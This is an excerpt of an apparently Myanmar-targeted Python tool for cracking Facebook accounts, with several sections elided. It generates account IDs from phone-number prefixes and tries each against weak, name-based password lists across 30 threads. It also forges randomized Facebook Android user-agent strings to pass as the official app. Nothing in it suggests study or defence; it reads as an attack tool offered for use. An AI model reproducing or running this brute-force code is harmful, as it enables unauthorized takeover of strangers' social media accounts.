...
os.system('xdg-open https://www.facebook.com/nay.htetlinunlockservice?mibextid=vk8aRt')
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 0945,0925,0978,0997')
		...
		with tred(max_workers=30) as TRT:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'zawzaw','kyawkyaw','chitchit']
				if pcs in ['2','02']:
					passlist = [psx,ids,'zawzaw','chitchit','kyawkyaw']
				elif pcs in ['3','03']:
...
def gmail():
		...
		clear()
		print('\033[1;37m example: kyaw, zaw, aung, chit\033[1;97m')
		linex()
...
def api2(ids,names,passlist):
        try:
                ...
                for pw in passlist:
                        ...
                        ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/338.0.0.22.72;FBBV/37183986;FBDM/{density=1.5,width=1080,height=1080};FBLC/en_PK;FBRV/82327371;FBCR/Nepal_Telecom;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/5.0.3;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
